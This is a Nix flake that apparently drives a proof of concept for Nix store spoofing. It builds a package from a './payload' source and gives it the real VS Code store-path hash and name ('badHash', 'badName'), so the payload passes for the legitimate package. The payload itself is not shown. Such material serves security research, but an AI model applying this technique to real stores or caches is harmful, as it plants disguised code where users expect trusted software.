{
  # get nix >2.19 with nar pack
  inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";

  outputs = {
    self,
    nixpkgs,
  }: let
    system = "x86_64-linux";
    pkgs = import nixpkgs {
      inherit system;
      config.allowUnfree = true;
      overlays = [
        (final: prev: {
          nix = final.nixVersions.nix_2_19;
        })
      ];
    };
  in {
    packages.${system} = {
      default = pkgs.callPackage ./package.nix {
        badSrc = ./payload;
      };

      vscode = let
        prev = pkgs.vscode;
      in
        pkgs.callPackage ./package.nix {
          badHash = builtins.substring 11 32 prev.outPath;
          badName = prev.name;
          badSrc = ./payload;
        };
    };

    devShells.${system}.default = pkgs.mkShellNoCC {
      packages = [
        pkgs.nix
      ];
    };
  };
}
